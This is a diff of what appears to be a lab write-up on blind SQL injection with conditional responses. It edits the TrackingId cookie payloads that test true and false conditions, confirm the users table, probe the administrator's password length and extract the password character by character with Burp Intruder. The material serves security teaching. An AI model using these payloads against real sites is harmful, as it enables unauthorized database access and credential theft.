@@ -21,8 +21,8 @@
 
 Modified the `TrackingId` cookie value:
 
-* `TrackingId=xyz' AND '1'='1` → **"Welcome back" appears** (true condition)
-* `TrackingId=xyz' AND '1'='2` → **"Welcome back" disappears** (false condition)
+* `TrackingId=xyz' AND '1'='1'--` → **"Welcome back" appears** (true condition)
+* `TrackingId=xyz' AND '1'='2'--` → **"Welcome back" disappears** (false condition)
 
 ![check datatype column](images/12/sql_ck.png)
 
@@ -40,7 +40,7 @@ SELECT tracking-id FROM tracking-table WHERE trackingId = 'xyz'
 
 ```plain id="3xq1ku"
 TrackingId=xyz' AND (SELECT 'a'
-FROM users LIMIT 1)='a
+FROM users LIMIT 1)='a'--
 ```
 ![check datatype column](images/12/usr_tbl_ck.png)
 
@@ -50,7 +50,7 @@ FROM users LIMIT 1)='a
 
 ```plain id="8g2k5w"
 TrackingId=xyz' AND (SELECT 'a'
-FROM users WHERE username='administrator')='a
+FROM users WHERE username='administrator')='a'--
 ```
 ![check datatype column](images/12/usr_ck.png)
 
@@ -60,13 +60,13 @@ FROM users WHERE username='administrator')='a
 
 ```plain id="m4w9zp"
 TrackingId=xyz' AND (SELECT 'a'
-FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
 ```
 ![check datatype column](images/12/pass_len_ck.png)
 
 ```plain id="m4w9zp"
 TrackingId=xyz' AND (SELECT 'a'
-FROM users WHERE username='administrator' AND LENGTH(password)>25)='a
+FROM users WHERE username='administrator' AND LENGTH(password)>25)='a'--
 ```
 ![check datatype column](images/12/pass_len_ck_ls_25.png)
 
@@ -78,7 +78,7 @@ Used **Burp Intruder Cluster Bomb** with two payload positions:
 
 ```plain id="p8s4jd"
 TrackingId=xyz' AND (SELECT
-SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
+SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
 ```
 ![check datatype column](images/12/pass_len_ck20.png)
 
